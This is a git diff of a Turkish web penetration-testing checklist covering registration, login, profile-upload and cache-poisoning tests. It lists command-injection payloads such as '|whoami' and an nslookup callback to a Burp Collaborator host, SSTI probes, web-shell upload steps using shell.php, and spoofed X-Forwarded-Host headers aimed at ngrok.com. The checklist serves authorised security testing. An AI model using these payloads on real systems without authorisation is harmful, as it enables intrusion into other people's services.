@@ -8,7 +8,7 @@
 - [ ] Kayit olma asamasinda SSTI dene ve mailine gelen kisimda isleme girmis mi bak <%= 7 * 7 %> %{8 * 8}
 - [ ] Mail kisminda json verisi olarak mumkunse cift mail gir ikisinede gelecek mi?
 - [ ] Mail kisminda ;sleep+10; denemesi yap Command injection |whoami -- ||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
-- [ ] 
+
 
 ### LOGIN
 - [ ] Login kisminda mail icin ping denemsi : @mail ||ping+-c+10+127.0.0.1||
@@ -18,3 +18,11 @@
 - [ ] Jwt Tokenleri kontrol et ve zafiyet var mi arastir
 - [ ] Login kismina XOR time based testi yap
 
+### EDIT  PROFILE
+- [ ] Profil fotografi yukleme kisminda File Upload  zafiyetlerini dene - cmd=ls shell.php - exiftool - lfi shell.php - .htaccess
+- [ ] Mail dogrulama isterse tekrar json olarak cift mail denemesi yapabilirsin.
+
+
+### HOME
+
+- [ ] Web Cache Poisoning - MISS HIT - X-Forwarded-Host: ngrok.com X-Host: ngrok.com X-Forwarded-Server: ngrok.com 
